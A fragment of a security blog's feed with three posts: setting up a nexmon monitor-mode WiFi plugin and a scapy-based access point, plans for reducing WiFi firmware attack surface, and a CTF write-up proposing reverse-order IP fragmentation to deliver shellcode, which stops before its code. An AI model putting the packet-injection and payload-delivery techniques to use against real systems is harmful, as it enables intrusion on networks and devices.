242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">//...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">func</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">main</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">//...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	unix_plugin_router</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token function" style="color:rgb(80, 250, 123)">HandleFunc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"/change_channel"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> changeChannel</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token function" style="color:rgb(80, 250, 123)">Methods</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"PUT"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="updating-the-startup-script">Updating the startup script<a href="https://www.supernetworks.org/pages/blog/spr-nexmon#updating-the-startup-script" class="hash-link" aria-label="Direct link to Updating the startup script" title="Direct link to Updating the startup script">​</a></h3>
<p>When the container runs, we'll have it make sure the seemo firmware and kernel module
are loaded fresh.</p>
<p>startup.sh:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">#!/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cd /nexmon</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cp brcmfmac43455-sdio.bin /lib/firmware/cypress/cyfmac43455-sdio-standard.bin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rmmod brcmfmac_wcc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rmmod brcmfmac</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">insmod brcmfmac.ko</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sleep 1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">iw phy `iw dev wlan0 info | awk '/wiphy/ {printf "phy" $2}'` interface add mon0 type monitor</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">echo [+] Loaded</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cd /</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/nexmon_plugin</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="loading">Loading<a href="https://www.supernetworks.org/pages/blog/spr-nexmon#loading" class="hash-link" aria-label="Direct link to Loading" title="Direct link to Loading">​</a></h2>
<p>After building, with <code>docker compose build</code>, we'll configure the API to load the plugin.</p>
<p>In the UI or by modifying <code>configs/base/api.json</code>, add the nexmon plugin*</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">{</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> "Name": "nexmon",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> "URI": "nexmon",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> "UnixPath": "/state/plugins/nexmon/socket",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> "Enabled": true,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> "Plus": false,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> "GitURL": "",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> "ComposeFilePath": ""</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Start the plugin with</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">SUPERDIR=/home/spr/super/ docker compose up -d</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="testing">Testing<a href="https://www.supernetworks.org/pages/blog/spr-nexmon#testing" class="hash-link" aria-label="Direct link to Testing" title="Direct link to Testing">​</a></h2>
<p>Running tcpdump should show captured 802.11 packets from the environment</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token command shell-symbol important">#</span><span class="token command"> </span><span class="token command bash language-bash">tcpdump -i wlan0 ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token output">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">listening on wlan0, link-type IEEE802_11_RADIO (802.11 plus radiotap header), snapshot length 262144 bytes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">22:50:27.005540 1876482302us tsft 1.0 Mb/s 2412 MHz 11b -68dBm signal 0dBm noise Beacon (wifi-2.4) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 1, PRIVACY</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">22:50:27.046106 1876522917us tsft 1.0 Mb/s 2412 MHz 11b -46dBm signal 0dBm noise Beacon (wifi-2.4) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 1, PRIVACY</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">22:50:27.107930 1876584711us tsft 1.0 Mb/s 2412 MHz 11b -70dBm signal 0dBm noise Beacon (wifi-2.4) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 1, PRIVACY</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">22:50:27.148500 1876625317us tsft 1.0 Mb/s 2412 MHz 11b -46dBm signal 0dBm noise Beacon (wifi-2.4) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 1, PRIVACY</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">22:50:27.210323 1876687100us tsft 1.0 Mb/s 2412 MHz 11b -67dBm signal 0dBm noise Beacon (wifi-2.4) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 1, PRIVACY</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can also verify that our channel switch api extension works</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token command shell-symbol important">#</span><span class="token command"> </span><span class="token command bash language-bash">curl -u admin:admin localhost/plugins/nexmon/change_channel?channel=4/20 -X PUT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token command shell-symbol important">#</span><span class="token command"> </span><span class="token command bash language-bash">iw dev</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token output">phy#10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">        Interface wlan0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">                ifindex 44</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">                wdev 0xa00000002</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">                addr 00:00:00:00:00:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">                type monitor</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">                channel 4 (2427 MHz), width: 20 MHz, center1: 2427 MHz</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">        Interface mon0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">                ifindex 43</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">                wdev 0xa00000001</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">                addr e4:5f:01:fd:a1:76</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">                type managed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">                channel 4 (2427 MHz), width: 20 MHz, center1: 2427 MHz</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">                txpower 31.00 dBm</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><em>* Note that the SPR UI does not allow specifying a docker compose path directly from the UI.
Instead, a user can modify or create a list in <code>configs/base/custom_compose_paths.json</code> to do so.</em></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="running-barely-ap">Running barely-ap<a href="https://www.supernetworks.org/pages/blog/spr-nexmon#running-barely-ap" class="hash-link" aria-label="Direct link to Running barely-ap" title="Direct link to Running barely-ap">​</a></h2>
<p>Besides sniffing traffic, we can also do wild things with packet injection, like running a WPA2
Access Point written in scapy</p>
<p>Since the nexmon patch is a bit hacky, we set the wlan0 mac address ourselves and make sure the channel matches</p>
<div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ap </span><span class="token operator">=</span><span class="token plain"> AP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"turtlenet"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"password1234"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> mode</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"iface"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> iface</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"wlan0"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> mac</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"e4:5f:01:cd:a1:76"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> channel</span><span class="token operator">=</span><span class="token number">4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>“ET VOILÀ!”:</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token command info punctuation user" style="color:rgb(248, 248, 242)">root@wifilab0</span><span class="token command info punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token command info punctuation path" style="color:rgb(248, 248, 242)">~/barely-ap/src</span><span class="token command shell-symbol important">#</span><span class="token command"> </span><span class="token command bash language-bash">python3 ap.py                                                                                                                  </span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token output">command failed: Device or resource busy (-16)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">Created TUN interface scapyap at 10.10.10.1. Bind it to your services if needed.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">Sending Authentication to 56:66:a3:9c:71:8b from e4:5f:01:cd:a1:76 (0x0B)...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">Sending Association Response (0x01)...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">sent eapol m1 56:66:a3:9c:71:8b</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token output">[+] New associated station 56:66:a3:9c:71:8b for bssid e4:5f:01:cd:a1:76</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="want-to-try-it-yourself-on-spr">Want to try it yourself on SPR?<a href="https://www.supernetworks.org/pages/blog/spr-nexmon#want-to-try-it-yourself-on-spr" class="hash-link" aria-label="Direct link to Want to try it yourself on SPR?" title="Direct link to Want to try it yourself on SPR?">​</a></h2>
<p>You can grab <a href="https://github.com/spr-networks/spr-nexmon/tree/main" target="_blank" rel="noopener noreferrer">spr-nexmon here </a>
and barely-ap at <a href="https://github.com/spr-networks/barely-ap" target="_blank" rel="noopener noreferrer">https://github.com/spr-networks/barely-ap</a>.</p>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <category label="Raspberry Pi" term="Raspberry Pi"/>
        <category label="Python" term="Python"/>
        <category label="Scapy" term="Scapy"/>
        <category label="WiFi" term="WiFi"/>
        <category label="Linux" term="Linux"/>
        <category label="Nexmon" term="Nexmon"/>
        <category label="Seemoo Labs" term="Seemoo Labs"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Attack Surface Reduction Research (Part 1)]]></title>
        <id>https://www.supernetworks.org/pages/blog/barely-ap-surfaces</id>
        <link href="https://www.supernetworks.org/pages/blog/barely-ap-surfaces"/>
        <updated>2023-10-23T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Reducing Attack Surfaces (Part 1)]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="reducing-attack-surfaces-part-1">Reducing Attack Surfaces (Part 1)<a href="https://www.supernetworks.org/pages/blog/barely-ap-surfaces#reducing-attack-surfaces-part-1" class="hash-link" aria-label="Direct link to Reducing Attack Surfaces (Part 1)" title="Direct link to Reducing Attack Surfaces (Part 1)">​</a></h2>
<p>SPR lets users create adaptive, micro-segmented networks for connecting and managing devices.
In addition to fine-grained network visibility we also build hardened software and
work to avoid common security flaws. As SPR has matured we've started taking on further efforts
to eliminate attack surfaces.</p>
<p>When it comes to native code: we introduce none. As in, we have not written new native code for SPR anywhere.
We have one BPF filter, and its otherwise golang all the way down. We also do not run standard native services
where we can avoid them. We have replaced traditional C code for services such as DNS and DHCP with golang implementations, namely CoreDNS and CoreDHCP.</p>
<p>The remaining native code targets that we have in SPR are as follows:</p>
<ul>
<li>The Linux kernel. For example: ethernet, the tcp/ip stack, nftables, the mac80211 framework and vendor drivers</li>
<li>802.11 Firmware, Ethernet Firmware</li>
<li>Hostapd</li>
<li>PPP Daemon (off by default)</li>
<li>OS Services (Ubuntu)</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="targeting-the-whole-wifi-stack">Targeting the Whole WiFi Stack<a href="https://www.supernetworks.org/pages/blog/barely-ap-surfaces#targeting-the-whole-wifi-stack" class="hash-link" aria-label="Direct link to Targeting the Whole WiFi Stack" title="Direct link to Targeting the Whole WiFi Stack">​</a></h2>
<p>We believe the wifi firmware to be today's most insecure target (along with the vendor drivers). Many firmwares are blackbox,
poorly documented, and opaque to public security research. We want SPR to be immune to attacks like <a href="https://blog.exodusintel.com/2017/07/26/broadpwn/" target="_blank" rel="noopener noreferrer">Broadpwn</a>
and <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Pi-Exploiting-Qualcomm-WLAN-And-Modem-Over-The-Air-wp.pdf" target="_blank" rel="noopener noreferrer">Qualcomm Exploitation</a>.</p>
<p>We've previously published <a href="https://github.com/spr-networks/barely-ap" target="_blank" rel="noopener noreferrer">barely-ap</a> to teach people about WiFi authentication.
It can and does work with real wifi chips running in monitor mode to connect clients over the air. We've tested with Android, iOS, and Linux devices.</p>
<p>The plan is to build a series of experiments to host high-speed wifi.</p>
<p>In the near term:</p>
<ol>
<li>Develop a Proof-of-Concept AP with scapy in monitor mode (DONE)</li>
<li>Develop a shim from monitor frames to hostapd running under mac80211_hwsim. This is a work in progress.
We would like to see a rust kernel driver/userland daemon for this</li>
</ol>
<p>Future:</p>
<ol start="3">
<li>A full AP written in rust, operating on raw 802.11 frames (not relying on the Linux kernel 802.11 subsystem)</li>
<li>Rust protocol firmware for a wifi chip.</li>
</ol>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="developing-a-shim-explained">Developing a Shim Explained<a href="https://www.supernetworks.org/pages/blog/barely-ap-surfaces#developing-a-shim-explained" class="hash-link" aria-label="Direct link to Developing a Shim Explained" title="Direct link to Developing a Shim Explained">​</a></h2>
<p>By running the card in monitor mode,  protocol parsing in the card firmware is substantially reduced if not altogether eliminated.</p>
<p>And with relaying frames over to macsim, hostapd is good to go.
What needs to happen however is making this incredibly fast, and researching rate negotiation and
what calls might need to be made to firmware to enable higher coding rates.</p>
<p>By using hostapd and the kernel mac80211 stack, we still maintain some native attack surface, however we get a known working,
security-tested AP that will be compatible with a wide variety of devices, without the firmware protocol parsing and the vendor driver parsing.</p>
<p>For next steps, a proof-of-concept with scapy is actually much too slow. We want to start
with a rust userland daemon leveraging iouring. If that doesn't fly then we'll go to a shim in the kernel.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="interested-in-working-with-us-please-reach-out">Interested in working with us? Please reach out<a href="https://www.supernetworks.org/pages/blog/barely-ap-surfaces#interested-in-working-with-us-please-reach-out" class="hash-link" aria-label="Direct link to Interested in working with us? Please reach out" title="Direct link to Interested in working with us? Please reach out">​</a></h2>
<p>We are actively seeking an intern to help develop rust+wifi for SPR.</p>
<p>You can contact us at  spr-wifi [ a-t ] supernetworks.org  or hop on the <a href="https://discord.gg/EUjTKJPPAX" target="_blank" rel="noopener noreferrer">discord</a></p>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <category label="Python" term="Python"/>
        <category label="Scapy" term="Scapy"/>
        <category label="WiFi" term="WiFi"/>
        <category label="Linux" term="Linux"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[One Weird Trick to fix your CTF Payloads]]></title>
        <id>https://www.supernetworks.org/pages/blog/scapy-revfrag</id>
        <link href="https://www.supernetworks.org/pages/blog/scapy-revfrag"/>
        <updated>2023-09-15T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Noppenheimer]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="noppenheimer">Noppenheimer<a href="https://www.supernetworks.org/pages/blog/scapy-revfrag#noppenheimer" class="hash-link" aria-label="Direct link to Noppenheimer" title="Direct link to Noppenheimer">​</a></h2>
<p>At Defcon CTF Finals, the Final round of  <a href="https://livectf.com/" target="_blank" rel="noopener noreferrer">LiveCTF</a> went into sudden death.
The challenge was named Noppenheimer, a play on the Oppenheimer film that was released, and NOP (NO-OP) instructions.</p>
<p>Contestants had to turn a random sequence of bytes into a gadget/shellcode cave by converting bytes into NOPs,
by sending "nuke" Launch commands.</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Options:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LAUNCH x,y - Launch a test at position x,y</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">VIEW - See state of test site</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ENDTEST - Conclude testing</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Both teams solved locally.  But they couldn't exploit Noppenheimer against the remote system.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-went-wrong">What Went Wrong<a href="https://www.supernetworks.org/pages/blog/scapy-revfrag#what-went-wrong" class="hash-link" aria-label="Direct link to What Went Wrong" title="Direct link to What Went Wrong">​</a></h2>
<p>Teams used a single <code>read/recv</code> syscall to receive to get shellcode to run. Without any delays in the program,
the call will return quickly and if the payload is larger than the MTU it will return partial TCP data.
The payloads were crashing on the remote end as they didn't have working shellcode.</p>
<p>As @ZetaTwo and @psifertex <a href="https://youtu.be/VxDnpShqloA?t=16683" target="_blank" rel="noopener noreferrer">explain</a>, the conditions which cause this are
highly specific to the exploit with payload length, delays, and other factors. The testers exploits didnt trigger this problem.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="solving-with-ip-fragmentation">Solving with IP Fragmentation<a href="https://www.supernetworks.org/pages/blog/scapy-revfrag#solving-with-ip-fragmentation" class="hash-link" aria-label="Direct link to Solving with IP Fragmentation" title="Direct link to Solving with IP Fragmentation">​</a></h2>
<p>IP Packets can be fragmented into multiple packets when they exceed the MTU size,
which is the maximum amount of octets accepted at layer 2 on Ethernet.</p>
<p>By sending fragments in reverse order, it can be ensured that the recv/read call will
get all of the data that has been sent, even beyond the MTU size.</p>
<p>Here is a python solution that combines scapy with pwntools, to run inside of a container, which does just that.</p>
<p><img decoding="async" loading="lazy" src="https://www.supernetworks.org/pages/assets/images/noppenheimer-772f2f7deb2622bf2c0904c024b136ef.gif" width="1200" height="600" class="img_ev3q"></p>
